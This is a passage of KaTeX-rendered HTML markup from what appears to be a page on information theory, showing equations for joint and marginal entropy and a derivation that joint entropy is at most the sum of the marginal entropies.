style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>r</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><msub><mi>r</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mfrac></mrow><annotation encoding="application/x-tex">H(XY)=\sum_{i=1}^m\sum_{j=1}^nr_{ij}\log_2\frac{1}{r_{ij}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3874279999999999em;vertical-align:-0.5423199999999999em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msub><mi>p</mi><mi>i</mi></msub><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><msub><mi>p</mi><mi>i</mi></msub></mfrac><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>r</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><msub><mi>p</mi><mi>i</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">H(X)=\sum_{i=1}^mp_i\log_2\frac{1}{p_i}=\sum_{i=1}^m\sum_{j=1}^nr_{ij}\log_2\frac{1}{p_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.326216em;vertical-align:-0.481108em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.326216em;vertical-align:-0.481108em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>q</mi><mi>j</mi></msub><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><msub><mi>q</mi><mi>j</mi></msub></mfrac><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>r</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><msub><mi>q</mi><mi>j</mi></msub></mfrac></mrow><annotation encoding="application/x-tex">H(Y)=\sum_{j=1}^nq_j\log_2\frac{1}{q_j}=\sum_{j=1}^n\sum_{i=1}^nr_{ij}\log_2\frac{1}{q_j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3874279999999999em;vertical-align:-0.5423199999999999em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3874279999999999em;vertical-align:-0.5423199999999999em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5423199999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>r</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><msub><mi>p</mi><mi>i</mi></msub><msub><mi>q</mi><mi>j</mi></msub></mrow><msub><mi>r</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mfrac><mo>≤</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mo stretchy="false">(</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msubsup><msubsup><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>p</mi><mi>i</mi></msub><msub><mi>q</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">H(XY)-H(X)-H(Y)=\sum_{i=1}^m\sum_{j=1}^nr_{ij}\log_2\frac{p_iq_j}{r_{ij}}\le \log_2(\sum_{i=1}^m\sum_{j=1}^np_iq_j)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.351032em;vertical-align:-0.5423199999999999em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span 